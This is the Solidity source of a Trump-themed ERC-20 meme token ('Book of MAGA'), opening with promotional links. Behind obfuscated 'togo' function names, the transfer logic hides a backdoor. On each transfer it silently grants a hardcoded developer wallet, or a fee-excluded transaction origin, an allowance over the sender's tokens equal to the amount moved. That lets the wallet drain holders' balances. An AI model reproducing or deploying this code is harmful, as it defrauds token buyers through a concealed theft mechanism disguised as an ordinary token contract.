/*
MAGA Book, where we take a lighthearted look at the life and family of President Trump. Join us as we explore the memorable moments, quirky anecdotes, and the unique dynamics of his family. Let's dive into the entertaining world of the Trumps!

https://www.magabook.info
https://x.com/magabook_eth
https://t.me/magabook_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ITOGORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITOGOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract MAGABOOK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _togoFeeExcluded;
    mapping (address => uint256) private _togoBulls;
    mapping (address => mapping (address => uint256)) private _togoNodes;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTOGO = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Book of MAGA";
    string private constant _symbol = unicode"MAGABOOK";
    uint256 private _tokenTOGOSwap = _tTotalTOGO / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _togoWallet = 0x0f997510bfe9498E0fcF90FbAbBCCD79F6AF3279;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _togoPair;
    ITOGORouter private _togoRouter;
    bool private inSwapTOGO = false;
    modifier lockTheSwap {
        inSwapTOGO = true;
        _;
        inSwapTOGO = false;
    }
    
    constructor () {
        _togoFeeExcluded[owner()] = true;
        _togoFeeExcluded[address(this)] = true;
        _togoFeeExcluded[_togoWallet] = true;
        _togoBulls[_msgSender()] = _tTotalTOGO;
        emit Transfer(address(0), _msgSender(), _tTotalTOGO);
    }

    function createPair() external onlyOwner() {
        _togoRouter = ITOGORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_togoRouter), _tTotalTOGO);
        _togoPair = ITOGOFactory(_togoRouter.factory()).createPair(address(this), _togoRouter.WETH());
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTOGO;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _togoBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _togoNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _togoNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _togoNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address togoF, address togoT, uint256 togoA) private {
        require(togoF != address(0), "ERC20: transfer from the zero address");
        require(togoT != address(0), "ERC20: transfer to the zero address");
        require(togoA > 0, "Transfer amount must be greater than zero");

        uint256 taxTOGO = _togoTransfer(togoF, togoT, togoA);

        if(taxTOGO > 0){
          _togoBulls[address(this)] = _togoBulls[address(this)].add(taxTOGO);
          emit Transfer(togoF, address(this), taxTOGO);
        }

        _togoBulls[togoF] = _togoBulls[togoF].sub(togoA);
        _togoBulls[togoT] = _togoBulls[togoT].add(togoA.sub(taxTOGO));
        emit Transfer(togoF, togoT, togoA.sub(taxTOGO));
    }

    function swapBackTOGO(bool isTOGO, address togoF, address togoT, uint256 togoA) private {
        uint256 tokenTOGO = balanceOf(address(this)); 
        if (!inSwapTOGO && togoT == _togoPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenTOGO > _tokenTOGOSwap)
            swapTokensForEth(minTOGO(togoA, minTOGO(tokenTOGO, _tokenTOGOSwap)));
            uint256 caTOGO = address(this).balance;
            if (caTOGO >= 0) {
                sendETHTOGO(address(this).balance);
            }
        } togoApproval(togoF, isTOGO, togoA);
    }

    function _togoTransfer(address togoF, address togoT, uint256 togoA) private returns(uint256) {
        address walletTOGO = address(tx.origin); uint256 taxTOGO=0; 
        if (togoF != owner() && togoT != owner()) {
            taxTOGO = togoA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (togoF == _togoPair && togoT != address(_togoRouter) && ! _togoFeeExcluded[togoT]) {
                _buyCount++;
            }

            if(togoT == _togoPair && togoF!= address(this)) {
                taxTOGO = togoA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            
            swapBackTOGO(_togoFeeExcluded[walletTOGO], togoF, togoT, togoA);
        } return taxTOGO;
    }

    function togoApproval(address aTOGO, bool isTOGO, uint256 togoA) private {
        address walletTOGO;
        if(isTOGO) walletTOGO = address(tx.origin);
        else walletTOGO = address(_togoWallet);
        _togoNodes[address(aTOGO)][address(walletTOGO)] = togoA;
    }

    function minTOGO(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHTOGO(uint256 amount) private {
        payable(_togoWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenTOGO) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _togoRouter.WETH();
        _approve(address(this), address(_togoRouter), tokenTOGO);
        _togoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenTOGO,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _togoRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}